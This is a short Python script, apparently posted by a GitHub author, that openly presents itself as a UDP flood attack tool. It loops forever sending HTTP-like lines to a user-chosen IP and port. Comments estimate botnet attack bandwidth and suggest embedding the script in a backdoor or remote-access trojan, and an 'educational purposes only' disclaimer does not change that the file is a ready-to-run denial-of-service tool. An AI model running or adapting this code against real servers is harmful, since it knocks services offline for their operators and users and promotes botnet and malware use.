# Author: TryWarz
# Github: https://github.com/TryWarz

# This script is for educational purposes only.
# I am not responsible for any damage done by this script.
# Use this script at your own risk.

# This script is a UDP flood attack.
# This script will send a GET request to the target server.

# 1 botnet = 20 - 100 mb/s

# if you have 20k botnet = +400 Gbps/s
# if you have 50k botnet = +1 Tbps/s

# Easy to put in a backdoor or a RAT.

IP = "" # change this to the IP you want to attack
PORT = 80 # change this to the port you want to attack

import socket
import threading

def start():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        for _ in range(100):
            s.sendto(b"GET / HTTP/1.1\r\n", (IP, PORT))
            s.sendto(b"Host: " + IP.encode() + b"\r\n\r\n", (IP, PORT))
    s.close()


threading.Thread(target=start).start()
print("Attack started!")